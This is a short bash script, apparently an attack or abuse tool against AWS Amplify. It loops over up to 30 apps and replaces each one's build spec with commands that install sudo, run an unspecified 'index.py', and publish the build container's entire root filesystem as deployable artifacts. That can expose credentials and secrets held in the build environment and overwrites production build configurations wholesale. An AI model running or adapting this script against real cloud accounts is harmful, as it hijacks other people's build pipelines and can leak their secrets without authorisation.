#!/usr/bin/env bash

for i in {0..29}; do
  APPID=$(aws amplify list-apps --output json --query 'apps['$i'].appId'| tr -d '"' 2> /dev/null)
  aws amplify update-app --app-id $APPID --build-spec "
version: 1
frontend:
  phases:
    build:
      commands: 
      - yum install sudo -y
      - python index.py
  artifacts:
    baseDirectory: /
    files:
      - '**/*'
  cache:
    paths: []
"
done
